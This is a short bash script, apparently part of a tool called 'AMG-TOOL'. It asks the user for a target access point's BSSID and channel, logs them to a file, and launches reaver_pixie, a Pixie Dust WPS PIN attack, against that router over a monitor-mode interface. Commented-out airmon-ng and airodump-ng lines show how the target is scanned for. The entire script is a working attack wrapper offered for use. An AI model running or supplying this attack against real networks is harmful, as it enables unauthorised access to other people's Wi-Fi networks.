#!/bin/bash
#clear
#airmon-ng start wlan0
#clear
#airodump-ng mon0
echo . > log.txt
echo "Insert The BSSID : "
read -p "AMG-TOOL>>" BSSID
echo "Insert The channel Number: "
read -p "AMG-TOOL>>" CHANNEL
clear
echo . >> log.txt
echo BS1 : $BSSID >> log.txt
echo ch1 : $CHANNEL >> log.txt
echo . >> log.txt
reaver_pixie -F -G -i mon0 -b $BSSID -c $CHANNEL -a -n -vv -D >> log.txt


echo Done

